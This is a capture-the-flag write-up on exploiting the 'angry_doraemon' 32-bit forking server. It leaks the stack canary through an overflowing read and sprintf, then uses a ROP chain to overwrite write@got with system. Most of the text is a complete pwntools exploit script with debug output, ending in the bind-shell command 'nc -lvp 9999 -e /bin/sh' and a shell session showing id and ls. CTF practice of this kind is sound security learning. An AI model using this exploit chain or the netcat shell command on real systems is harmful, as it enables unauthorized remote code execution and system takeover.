# Angry_Doraemon

```bash
checksec ./angry_doraemon 
[*] '/home/ubuntu/Desktop/Pwnable/rop/angry_draemon/angry_doraemon'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

This binary has `Partical RELRO`, `NX Bit`, `Stack Canary`.

And here is `main` function

```c
void __cdecl __noreturn main()
{
  int optval; // [esp+28h] [ebp-C8h]
  socklen_t addr_len; // [esp+2Ch] [ebp-C4h]
  int v2; // [esp+30h] [ebp-C0h]
  int v3; // [esp+34h] [ebp-BCh]
  int v4; // [esp+38h] [ebp-B8h]
  __pid_t v5; // [esp+3Ch] [ebp-B4h]
  int (*v6)(); // [esp+40h] [ebp-B0h]
  int v7; // [esp+44h] [ebp-ACh]
  int v8; // [esp+C4h] [ebp-2Ch]
  char s; // [esp+CCh] [ebp-24h]
  uint16_t v10; // [esp+CEh] [ebp-22h]
  uint32_t v11; // [esp+D0h] [ebp-20h]
  struct sockaddr addr; // [esp+DCh] [ebp-14h]
  unsigned int v13; // [esp+ECh] [ebp-4h]

  v13 = __readgsdword(0x14u);
  optval = 1;
  v6 = sub_80488CB;
  sigemptyset(&v7);
  v8 = 0;
  v2 = sigaction(17, &v6, 0);
  if ( v2 )
    sub_804889D("sigaction error");
  v3 = socket(2, 1, 0);
  memset(&s, 0, 0x10u);
  *&s = 2;
  v11 = htonl(0);
  v10 = htons(0x22B8u);
  setsockopt(v3, 1, 2, &optval, 4u);
  if ( bind(v3, &s, 0x10u) == -1 )
    sub_804889D("bind() error");
  if ( listen(v3, 10) == -1 )
    sub_804889D("listen() error");
  while ( 1 )
  {
    do
    {
      addr_len = 16;
      v4 = accept(v3, &addr, &addr_len);
    }
    while ( v4 == -1 );
    v5 = fork();
    if ( v5 == -1 )
    {
      close(v4);
    }
    else
    {
      if ( v5 <= 0 )
      {
        close(v3);
        sub_8049201(v4);
        close(v4);
        exit(0);
      }
      close(v4);
    }
  }
}
```

`main()` opens socket and return `fd` to v3. After fork, it returns `fd` to v5. So, `v5` is 4 (Because after `stderr`, it opens two `fd`s). 


```c
unsigned int __cdecl sub_8049201(int fd)
{
  char buf; // [esp+18h] [ebp-10h]
  unsigned int v3; // [esp+1Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  sub_8048909(fd);
  write(fd, "Waiting 2 seconds...\n", 0x15u);
  sleep(2u);
  while ( 1 )
  {
    sub_8048998(fd);
    read(fd, &buf, 4u);
    switch ( buf )
    {
      case 49:
        sub_8048B30(fd);
        break;
      case 50:
        sub_8048CDC(fd);
        break;
      case 51:
        if ( sub_8048EAA(fd) )
          return __readgsdword(0x14u) ^ v3;
        break;
      case 52:
        sub_8048FC6(fd);
        break;
      case 53:
        sub_8049100(fd);
        break;
      case 54:
        return __readgsdword(0x14u) ^ v3;
      default:
        write(fd, "Unknown menu\n", 0xDu);
        break;
    }
    if ( dword_804B078 <= 0 )
      break;
    if ( dword_804B078 > 100 )
      dword_804B078 = 100;
  }
  write(fd, "\"I'll be back...\"\n", 0x12u);
  return __readgsdword(0x14u) ^ v3;
}
```

We can select 1 to 6, and in 5, there is hidden attack source.

```c
unsigned int __cdecl sub_8049100(int fd)
{
  void (*buf)(void); // [esp+22h] [ebp-16h]
  int v3; // [esp+26h] [ebp-12h]
  __int16 v4; // [esp+2Ah] [ebp-Eh]
  unsigned int v5; // [esp+2Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  buf = 0;
  v3 = 0;
  v4 = 0;
  write(fd, "left or right? (l/r) \n", 0x15u);
  read(fd, &buf, 4u);
  if ( buf == 108 )
  {
    write(fd, "left-fist attack!\n", 0x12u);
LABEL_7:
    write(fd, "Sorry, nothing happened.\n\n", 0x1Au);
    return __readgsdword(0x14u) ^ v5;
  }
  if ( buf != 114 )
    goto LABEL_7;
  write(fd, "(special attack?!)\n", 0x13u);
  read(fd, &buf, 4u);
  if ( HIBYTE(buf) != 8 )
  {
    buf();
    goto LABEL_7;
  }
  return __readgsdword(0x14u) ^ v5;
}
```

But we only can use this buf() in condition that `HIBYTE(buf)` is not 0x8. The matter is that code section is in `0x8~`. so I find another one.

```c
unsigned int __cdecl sub_8048FC6(int fd)
{
  int v1; // eax
  ssize_t n; // ST1C_4
  int v4; // [esp+18h] [ebp-20h]
  int buf; // [esp+22h] [ebp-16h]
  int v6; // [esp+26h] [ebp-12h]
  __int16 v7; // [esp+2Ah] [ebp-Eh]
  unsigned int v8; // [esp+2Ch] [ebp-Ch]

  v8 = __readgsdword(0x14u);
  buf = 0;
  v6 = 0;
  v7 = 0;
  v4 = open("mouse.txt", 0);
  if ( v4 < 0 )
    sub_804889D("open() error");
  write(fd, "Are you sure? (y/n) ", 0x14u);
  read(fd, &buf, 0x6Eu);
  if ( buf == 121 )
  {
    v1 = sprintf(::buf, "You choose '%s'!\n", &buf);
    write(fd, ::buf, v1);
    n = read(v4, ::buf, 0x1388u);
    write(fd, ::buf, n);
    write(fd, "\n\"MOUSE!!!!!!!!! (HP - 25)\"\n", 0x1Cu);
    dword_804B078 -= 25;
  }
  return __readgsdword(0x14u) ^ v8;
}
```

Here, we can found vulunable code `read(fd, &buf, 0x6Eu)`. But `v8` is `Stack Canary`. We must leak this canary, and overwrite it to bypass `Stack Guard`. 

We can leak `canary` by `v1 = sprintf(::buf, "You choose '%s'!\n", &buf)`.

Server fork itself, so value of canary is not changed until server is down. 
This means that we can leak stack canary and re-use them. 

First, I try to leak stack canary by enter 10 bytes. 
`r.sendline('y'*10)`. I use `sendline`, so the number of sent bytes is `11bytes`. Because first byte of stack canary is `0x00`.

After sending `11 bytes`, we can get `3 bytes` of canary. 

And we can connect one more times to get shell.

Next I try to jump `08048C62`.

```asm
.text:08048C62                 mov     dword ptr [esp+8], 0
.text:08048C6A                 mov     dword ptr [esp+4], offset arg ; "sh"
.text:08048C72                 mov     dword ptr [esp], offset path ; "/bin/sh"
.text:08048C79                 call    _execl
```

But it didn't work. So I tried to make reverse shell in port 9999.

`nc -lvp 9999 -e /bin/sh`

And this is rop code.

```c
write(4, read@got, 4)
read(4, write@got, 4)
read(4, bss, len(cmd))
write(bss)
```

## exploit.py

```python
from pwn import *
from time import sleep

context.log_level = 'debug'

binary = ELF('./angry_doraemon')

write_plt = binary.plt['write']
write_got = binary.got['write']
read_plt = binary.plt['read']
read_got = binary.got['read']
exit_plt = binary.plt['exit']

bss = binary.bss()

cmd = 'nc -lvp 9999 -e /bin/sh'
system_offset = 0x9ad60

binsh = 0x804970d

pppr = 0x08048ea6

execl = 0x8048c62
attack_rop = 0x8049044

r = remote('localhost', 8888) 
r.recv()
log.info('wait for 2 seconds')
sleep(2)
r.recv()
r.sendline('4')
r.recv()
r.sendline('y'*10)
leak = r.recv()
canary_leak = u32(leak.split('y'*10)[1][:4].replace('\x0a', '\x00'))
ebp_leak = u32(leak.split('y'*10)[1][12:16])
log.info('leaked canary: ' + hex(canary_leak))
log.info('leaked ebp: ' + hex(ebp_leak))
r.close()

r = remote('localhost', 8888)
r.recv()
log.info('wait for 2 seconds')
sleep(2)
r.recv()
r.sendline('4')
r.recv()
payload = 'y'*10
payload += p32(canary_leak) + p32(ebp_leak) + 'a'*8
payload += p32(write_plt) + p32(pppr) + p32(4) + p32(read_got) + p32(4)
payload += p32(read_plt) + p32(pppr) + p32(4) + p32(write_got) + p32(4)
payload += p32(read_plt) + p32(pppr) + p32(4) + p32(bss) + p32(len(cmd))
payload += p32(write_plt) + p32(exit_plt) + p32(bss) + p32(0)
r.send(payload)
leak_read_got = u32(r.recv(4))
log.info('leaked read@got: ' + hex(leak_read_got))
r.send(p32(leak_read_got - system_offset))
r.send(cmd)
```

```python
[DEBUG] PLT 0x8048610 setsockopt
[DEBUG] PLT 0x8048620 read
[DEBUG] PLT 0x8048630 sleep
[DEBUG] PLT 0x8048640 __stack_chk_fail
[DEBUG] PLT 0x8048650 htons
[DEBUG] PLT 0x8048660 accept
[DEBUG] PLT 0x8048670 waitpid
[DEBUG] PLT 0x8048680 __gmon_start__
[DEBUG] PLT 0x8048690 exit
[DEBUG] PLT 0x80486a0 open
[DEBUG] PLT 0x80486b0 strlen
[DEBUG] PLT 0x80486c0 __libc_start_main
[DEBUG] PLT 0x80486d0 fprintf
[DEBUG] PLT 0x80486e0 write
[DEBUG] PLT 0x80486f0 bind
[DEBUG] PLT 0x8048700 memset
[DEBUG] PLT 0x8048710 execl
[DEBUG] PLT 0x8048720 fork
[DEBUG] PLT 0x8048730 sigemptyset
[DEBUG] PLT 0x8048740 htonl
[DEBUG] PLT 0x8048750 listen
[DEBUG] PLT 0x8048760 sprintf
[DEBUG] PLT 0x8048770 socket
[DEBUG] PLT 0x8048780 sigaction
[DEBUG] PLT 0x8048790 close
[*] '/home/ubuntu/Desktop/Pwnable/rop/angry_draemon/angry_doraemon'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to localhost on port 8888: Done
[DEBUG] Received 0x2f bytes:
    '\n'
    '  Angry doraemon! fight!\n'
    'Waiting 2 seconds...\n'
[*] wait for 2 seconds
[DEBUG] Received 0x78 bytes:
    00000000  0a 44 6f 72  61 65 6d 6f  6e 20 48 2e  50 3a 20 31  │·Dor│aemo│n H.│P: 1│
    00000010  30 30 0a 2d  20 41 74 74  61 63 6b 20  6d 65 6e 75  │00·-│ Att│ack │menu│
    00000020  20 2d 0a 00  20 31 2e 53  77 6f 72 64  0a 20 32 2e  │ -··│ 1.S│word│· 2.│
    00000030  53 63 72 65  77 64 72 69  76 65 72 0a  20 33 2e 52  │Scre│wdri│ver·│ 3.R│
    00000040  65 64 2d 62  65 61 6e 20  62 72 65 61  64 0a 20 34  │ed-b│ean │brea│d· 4│
    00000050  2e 54 68 72  6f 77 20 6d  6f 75 73 65  0a 20 35 2e  │.Thr│ow m│ouse│· 5.│
    00000060  46 69 73 74  20 61 74 74  61 63 6b 0a  20 36 2e 47  │Fist│ att│ack·│ 6.G│
    00000070  69 76 65 20  75 70 0a 3e                            │ive │up·>││
    00000078
[DEBUG] Sent 0x2 bytes:
    '4\n'
[DEBUG] Received 0x14 bytes:
    'Are you sure? (y/n) '
[DEBUG] Sent 0xb bytes:
    'yyyyyyyyyy\n'
*** [DEBUG] Received 0x2e bytes:
    00000000  59 6f 75 20  63 68 6f 6f  73 65 20 27  79 79 79 79  │You │choo│se '│yyyy│
    00000010  79 79 79 79  79 79 0a 0f  93 a5 18 68  f3 ff 23 2b  │yyyy│yy··│···h│··#+│
    00000020  e6 f7 28 68  f3 ff c5 92  04 08 04 27  21 0a        │··(h│····│···'│!·│
    0000002e
[*] leaked canary: 0xa5930f00
[*] leaked ebp: 0xfff36828
[*] Closed connection to localhost port 8888
[+] Opening connection to localhost on port 8888: Done
[DEBUG] Received 0x2f bytes:
    '\n'
    '  Angry doraemon! fight!\n'
    'Waiting 2 seconds...\n'
[*] wait for 2 seconds
[DEBUG] Received 0x78 bytes:
    00000000  0a 44 6f 72  61 65 6d 6f  6e 20 48 2e  50 3a 20 31  │·Dor│aemo│n H.│P: 1│
    00000010  30 30 0a 2d  20 41 74 74  61 63 6b 20  6d 65 6e 75  │00·-│ Att│ack │menu│
    00000020  20 2d 0a 00  20 31 2e 53  77 6f 72 64  0a 20 32 2e  │ -··│ 1.S│word│· 2.│
    00000030  53 63 72 65  77 64 72 69  76 65 72 0a  20 33 2e 52  │Scre│wdri│ver·│ 3.R│
    00000040  65 64 2d 62  65 61 6e 20  62 72 65 61  64 0a 20 34  │ed-b│ean │brea│d· 4│
    00000050  2e 54 68 72  6f 77 20 6d  6f 75 73 65  0a 20 35 2e  │.Thr│ow m│ouse│· 5.│
    00000060  46 69 73 74  20 61 74 74  61 63 6b 0a  20 36 2e 47  │Fist│ att│ack·│ 6.G│
    00000070  69 76 65 20  75 70 0a 3e                            │ive │up·>││
    00000078
[DEBUG] Sent 0x2 bytes:
    '4\n'
[DEBUG] Received 0x14 bytes:
    'Are you sure? (y/n) '
[DEBUG] Sent 0x66 bytes:
    00000000  79 79 79 79  79 79 79 79  79 79 00 0f  93 a5 28 68  │yyyy│yyyy│yy··│··(h│
    00000010  f3 ff 61 61  61 61 61 61  61 61 e0 86  04 08 a6 8e  │··aa│aaaa│aa··│····│
    00000020  04 08 04 00  00 00 10 b0  04 08 04 00  00 00 20 86  │····│····│····│·· ·│
    00000030  04 08 a6 8e  04 08 04 00  00 00 40 b0  04 08 04 00  │····│····│··@·│····│
    00000040  00 00 20 86  04 08 a6 8e  04 08 04 00  00 00 80 b0  │·· ·│····│····│····│
    00000050  04 08 17 00  00 00 e0 86  04 08 90 86  04 08 80 b0  │····│····│····│····│
    00000060  04 08 00 00  00 00                                  │····│··│
    00000066
[DEBUG] Received 0x4 bytes:
    00000000  00 2b e6 f7                                         │·+··││
    00000004
[*] leaked read@got: 0xf7e62b00
[DEBUG] Sent 0x4 bytes:
    00000000  a0 7d dc f7                                         │·}··││
    00000004
[DEBUG] Sent 0x17 bytes:
    'nc -lvp 9999 -e /bin/sh'
[*] Closed connection to localhost port 8888
listening on [any] 9999 ...
```

```bash
$ nc localhost 9999
id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
ls
angry_doraemon
bread.txt
core
doraemon.txt
exploit.py
fs.txt
mouse.txt
peda-session-angry_doraemon.txt
ps.txt
test.py
```